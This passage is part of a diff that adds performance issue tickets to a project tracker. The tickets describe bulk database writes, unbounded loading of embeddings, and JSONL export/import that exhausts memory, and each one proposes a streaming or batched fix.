+                INSERT INTO issue_labels (issue_id, label_name, created_at)
+                VALUES :values
+            """),
+            {"values": label_values}
+        )
+    
+    # Same pattern for assignees and references
+```
+
+### Acceptance Criteria
+- [ ] Bulk DELETE for labels/assignees/references
+- [ ] Bulk INSERT for labels/assignees/references
+- [ ] Performance test: 10 labels < 5ms vs current 50ms
+- [ ] Bulk operations tested with 100+ labels
+
+### Notes
+This is a classic bulk operations anti-pattern. The fix should provide 10-50x speedup for issues with multiple labels/assignees and dramatically improve bulk import/export performance.
+
+---
+id: "PERF-005@j5k6l7"
+title: "Unbounded Embedding Loading in get_all_embeddings_for_model()"
+description: "Loads ALL embeddings into memory without limit causing OOM crashes"
+created: 2024-12-27
+section: "knowledge_graph"
+tags: [performance, memory, embeddings, oom, scaling]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/knowledge_graph/db.py
+---
+
+### Problem
+In `db.py:1056-1075`, `get_all_embeddings_for_model()` loads all embeddings without limit:
+
+```python
+def get_all_embeddings_for_model(self, model: str) -> list[Embedding]:
+    cur = conn.execute("""
+        SELECT embedding_pk, full_id, model, dimensions, vector, created_at
+        FROM embeddings WHERE model = ?
+        """, (model,))
+    
+    # Load ALL embeddings into memory at once
+    return [self._row_to_embedding(row) for row in cur.fetchall()]
+```
+
+**Performance issue:**
+- Loads ALL embeddings for a model without limit
+- Embeddings are large (1536 floats × 4 bytes = 6KB per vector)
+- 10,000 embeddings = 60MB memory
+- 100,000 embeddings = 600MB memory
+- While streaming methods exist (lines 1107-1132), this method bypasses them
+
+**Impact:**
+- Large knowledge bases cause OOM crashes
+- Semantic search operations fail on large datasets
+- Server restarts during indexing operations
+- Memory pressure affects other operations
+- Prevents scaling beyond ~10k nodes
+
+### Affected Files
+- `src/dot_work/knowledge_graph/db.py` (lines 1056-1075)
+
+### Importance
+**HIGH**: Blocks scaling and causes crashes:
+- Prevents users from creating large knowledge bases
+- OOM crashes lose work and require restart
+- Memory exhaustion affects system stability
+- Makes semantic search unusable at scale
+
+### Proposed Solution
+Add safety limit and redirect to streaming method:
+
+```python
+def get_all_embeddings_for_model(self, model: str, limit: int = 10000) -> list[Embedding]:
+    """Get embeddings for a model with safety limit.
+
+    For large datasets, use stream_embeddings_for_model() instead to avoid OOM.
+    """
+    if limit == 0:
+        logger.warning(
+            f"get_all_embeddings_for_model() loading all embeddings for model {model} "
+            "- may cause OOM for large datasets"
+        )
+    cur = conn.execute("""
+        SELECT ... FROM embeddings WHERE model = ? LIMIT ?
+        """, (model, limit))
+    return [self._row_to_embedding(row) for row in cur.fetchall()]
+```
+
+Or redirect to streaming:
+```python
+def get_all_embeddings_for_model(self, model: str) -> list[Embedding]:
+    logger.warning("get_all_embeddings_for_model() unbounded - use stream_embeddings_for_model()")
+    return list(self.stream_embeddings_for_model(model, batch_size=1000))
+```
+
+### Acceptance Criteria
+- [ ] Safety limit parameter added (default 10000)
+- [ ] Warning logged when limit exceeded or bypassed
+- [ ] Documentation updated to recommend streaming
+- [ ] Performance test: 100k embeddings with limit succeeds
+
+### Notes
+The streaming method already exists. This fix prevents accidental OOM by default while still allowing power users to load all embeddings if needed with explicit parameter.
+
+---
+id: "PERF-006@k6l7m8"
+title: "Unbounded JSONL Export/Import"
+description: "Exports/imports load ALL issues into memory causing OOM on large datasets"
+created: 2024-12-27
+section: "db_issues"
+tags: [performance, memory, jsonl, export-import, scaling]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/db_issues/services/jsonl_service.py
+---
+
+### Problem
+In `jsonl_service.py:54-102`, `export()` loads ALL issues into memory first:
+
+```python
+def export(self, output_path: Path, ...):
+    # Load ALL issues into memory first
+    if status_filter:
+        issues = self.uow.issues.list_by_status(status_filter, limit=1000000, offset=0)
+    else:
+        issues = self.uow.issues.list_all(limit=1000000, offset=0)
+    
+    # Filter in-memory
+    if not include_completed:
+        issues = [i for i in issues if i.status != IssueStatus.COMPLETED]
+    
+    # Write to file (still holding all issues in memory)
+    with output_path.open("w", encoding="utf-8") as f:
+        for issue in issues:
+            f.write(jsonl_line + "\n")
+```
+
+**Performance issue:**
+- Exports load ALL issues into memory first
+- No streaming for large datasets
+- `limit=1000000` loads up to 1M issues
+- Issues can be large (description + labels + comments + assignees)
+- Same issue in `import_()` method (line 134)
+
+**Impact:**
+- Export/import fails with OOM on large issue trackers
+- 10,000 issues × 10KB each = 100MB+ in memory
+- 100,000 issues = 1GB+ memory required
+- Server crashes during backup/restore operations
+- Blocks backup/restore for large projects
+
+### Affected Files
+- `src/dot_work/db_issues/services/jsonl_service.py` (lines 54-102, 134+)
+
+### Importance
+**HIGH**: Blocks backup/restore and large-scale operations:
+- Cannot export large issue trackers
+- Backup/restore fails with OOM
+- Prevents moving large datasets between systems
+- Makes import/export unusable for production datasets
+
+### Proposed Solution
+Stream issues directly to file:
+
+```python
+def export(self, output_path: Path, ...):
+    with output_path.open("w", encoding="utf-8") as f:
+        # Use generator to stream issues
+        for issue in self._stream_issues(status_filter):
+            if include_completed or issue.status != IssueStatus.COMPLETED:
+                jsonl_line = self._issue_to_jsonl(issue)
+                f.write(jsonl_line + "\n")
+
+def _stream_issues(self, status_filter: IssueStatus | None) -> Iterator[Issue]:
+    """Stream issues in batches to avoid loading all into memory."""
+    offset = 0
+    batch_size = 1000
+    while True:
+        if status_filter:
+            issues = self.uow.issues.list_by_status(
+                status_filter, limit=batch_size, offset=offset
+            )
+        else:
+            issues = self.uow.issues.list_all(limit=batch_size, offset=offset)
+        
+        if not issues:
+            break
+        yield from issues
+        offset += len(issues)
+```
+
+Same pattern for import:
+
+```python
+def import_(self, input_path: Path, ...):
+    with input_path.open("r", encoding="utf-8") as f:
+        for line_num, line in enumerate(f, 1):
+            issue_data = json.loads(line)
+            # Process and save one issue at a time
+            issue = self._jsonl_to_issue(issue_data)
+            self.uow.issues.save(issue)
+            # Flush periodically
+            if line_num % 100 == 0:
+                self.uow.commit()
+    self.uow.commit()
+```
+
+### Acceptance Criteria
+- [ ] Export streams issues to file (batch_size 1000)
+- [ ] Import processes issues one-by-one or in small batches
+- [ ] Memory usage constant regardless of dataset size
+- [ ] Performance test: 100k issues export with < 100MB memory
+- [ ] Import/export preserve all data
+
+### Notes
+This fix enables export/import of unlimited datasets with constant memory usage. The streaming pattern is essential for large-scale data operations.
 
 ---
